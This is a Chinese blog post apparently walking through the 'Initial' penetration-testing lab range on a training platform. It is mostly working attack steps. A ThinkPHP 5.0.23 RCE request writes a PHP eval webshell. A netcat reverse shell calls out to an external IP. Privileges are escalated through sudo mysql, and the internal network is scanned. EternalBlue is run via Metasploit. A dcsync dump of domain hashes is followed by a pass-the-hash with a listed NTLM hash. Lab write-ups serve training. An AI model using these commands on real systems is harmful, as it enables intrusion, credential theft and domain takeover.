@@ -1,0 +1,220 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Initial - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Initial</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><h3 id="php-v5.0.23">php V5.0.23</h3>
+<p>查到exp</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">POST /index.php?s<span class="o">=</span>captcha HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 39.99.236.243
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>Macintosh<span class="p">;</span> Intel Mac OS X 10.15<span class="p">;</span> rv:109.0<span class="o">)</span> Gecko/20100101 Firefox/118.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">74</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">_method</span><span class="o">=</span>__construct<span class="p">&amp;</span>filter<span class="o">[]=</span>system<span class="p">&amp;</span><span class="nv">method</span><span class="o">=</span>get<span class="p">&amp;</span>server<span class="o">[</span>REQUEST_METHOD<span class="o">]=</span>ls /
+</span></span></code></pre></div></div><p>写马</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">php</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="php"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nx">http</span><span class="o">://</span><span class="mf">39.</span><span class="nx">xx</span><span class="o">.</span><span class="nx">xx</span><span class="o">.</span><span class="nx">xx</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">s</span><span class="o">=</span><span class="nx">captcha</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">POST</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">_method</span><span class="o">=</span><span class="nx">__construct</span><span class="o">&amp;</span><span class="nx">filter</span><span class="p">[]</span><span class="o">=</span><span class="nx">system</span><span class="o">&amp;</span><span class="nx">method</span><span class="o">=</span><span class="nx">get</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">[</span><span class="nx">REQUEST_METHOD</span><span class="p">]</span><span class="o">=</span><span class="k">echo</span> <span class="s1">&#39;%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3B%3F%3E&#39;</span> <span class="o">&gt;</span><span class="mf">1.</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//注意url编码一下
+</span></span></span></code></pre></div></div><p>然后蚁剑连接,反弹shell</p>
+<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 107.172.141.31 9999 &gt;/tmp/f</code></p>
+<p>找suid</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">shell</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="shell"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span></code></pre></div></div><p>sudo -l</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on ubuntu-web01:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on ubuntu-web01:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/mysql
+</span></span></code></pre></div></div><p><code>sudo mysql -e '\! /bin/sh'</code>提权</p>
+<p><code>cat /root/flag/flag01.txt</code></p>
+<p>拿到第一个flag<code>flag{60b53231-</code></p>
+<p>传文件fscan</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">./fscan_amd64 -h 172.22.1.0/24
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   ___                              _    
+</span></span><span class="line"><span class="cl">  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __ 
+</span></span><span class="line"><span class="cl"> / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /
+</span></span><span class="line"><span class="cl">/ /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;    
+</span></span><span class="line"><span class="cl"><span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  
+</span></span><span class="line"><span class="cl">                     fscan version: 1.8.2
+</span></span><span class="line"><span class="cl">start infoscan
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.1.15     is alive
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.1.2      is alive
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.1.18     is alive
+</span></span><span class="line"><span class="cl"><span class="o">(</span>icmp<span class="o">)</span> Target 172.22.1.21     is alive
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Icmp alive hosts len is: <span class="m">4</span>
+</span></span><span class="line"><span class="cl">172.22.1.15:22 open
+</span></span><span class="line"><span class="cl">172.22.1.2:445 open
+</span></span><span class="line"><span class="cl">172.22.1.21:139 open
+</span></span><span class="line"><span class="cl">172.22.1.18:139 open
+</span></span><span class="line"><span class="cl">172.22.1.2:139 open
+</span></span><span class="line"><span class="cl">172.22.1.21:135 open
+</span></span><span class="line"><span class="cl">172.22.1.18:135 open
+</span></span><span class="line"><span class="cl">172.22.1.2:135 open
+</span></span><span class="line"><span class="cl">172.22.1.18:80 open
+</span></span><span class="line"><span class="cl">172.22.1.15:80 open
+</span></span><span class="line"><span class="cl">172.22.1.18:3306 open
+</span></span><span class="line"><span class="cl">172.22.1.21:445 open
+</span></span><span class="line"><span class="cl">172.22.1.2:88 open
+</span></span><span class="line"><span class="cl">172.22.1.18:445 open
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> alive ports len is: <span class="m">14</span>
+</span></span><span class="line"><span class="cl">start vulscan
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.18
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>XIAORANG-OA01
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.1.18
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.2
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>DC01
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.1.2
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.21
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>XIAORANG-WIN7
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.1.21
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 172.22.1.21 MS17-010        <span class="o">(</span>Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 172.22.1.2  <span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter 14393<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios: 172.22.1.2      <span class="o">[</span>+<span class="o">]</span>DC DC01.xiaorang.lab             Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="m">2012</span> R2 Datacenter <span class="m">9600</span> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack <span class="m">1</span> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m<span class="o">=</span>login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle: http://172.22.1.18?m<span class="o">=</span>login code:200 len:4012   title:信呼协同办公系统
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
+</span></span><span class="line"><span class="cl">已完成 14/14
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 扫描结束,耗时: 9.786441836s
+</span></span></code></pre></div></div><p>Proxifier 连上socks5代理后访问是一个oa信呼</p>
+<p>后台rce<code>https://blog.csdn.net/solitudi/article/details/118675321</code>或者phpmyadmin弱密码进入</p>
+<p>写马拿第二个flag</p>
+<p>第二段<code>2ce3-4813-87d4-</code></p>
+<p>第三台机器不出网 永恒之蓝</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains4 msfconsole
+</span></span><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/x64/meterpreter/bind_tcp_uuid
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 172.22.1.21
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div></div><p>msf内拿用户hash值</p>
+<ol>
+<li><code>#msf中</code></li>
+<li><code>load kiwi</code></li>
+<li><code>kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit</code></li>
+</ol>
+<p>再用crackmapexec进行哈希传递</p>
+<ol>
+<li><code>p4 crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;whoami&quot;</code></li>
+<li><code>p4 crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</code></li>
+</ol>
+<p>好找</p>
+<p><code>/opt/homebrew/Cellar/proxychains-ng/4.16/.bottle/etc/proxychains.conf</code></p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/delegation" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Delegation</p>
+            </a>
+            
+
+            
+            <a href="/post/2022%e7%bd%91%e9%bc%8e%e6%9d%af%e5%8d%8a%e5%86%b3%e8%b5%9b%e5%a4%8d%e7%9b%98" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">2022网鼎杯半决赛复盘</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
